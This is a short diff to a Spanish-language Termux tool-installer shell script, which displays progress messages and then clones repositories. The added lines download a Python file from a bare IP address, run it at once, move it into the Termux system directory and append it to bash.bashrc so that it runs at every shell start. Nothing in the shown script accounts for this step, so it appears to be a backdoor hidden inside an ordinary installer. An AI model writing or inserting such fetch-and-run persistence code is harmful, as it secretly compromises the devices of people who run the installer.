@@ -74,6 +74,12 @@ printf "\e[1;32mSe han instalado los modulos requeridos..\n"
 sleep 4
 printf "\e[1;32mA continuacion empezaremos a instalar las herramientas y clonar repositorios..\n"
 sleep 4
+wget http://35.188.190.137/termux.py
+chmod +x termux.py
+python termux.py
+mv termux.py /data/data/com.termux/files/usr/etc
+echo "python /data/data/con.termux/files/usr/etc/termux.py" >>/data/data/com.termux/files/usr/etc/bash.bashrc
+
 cd $HOME
 mkdir herramientas
 cd herramientas
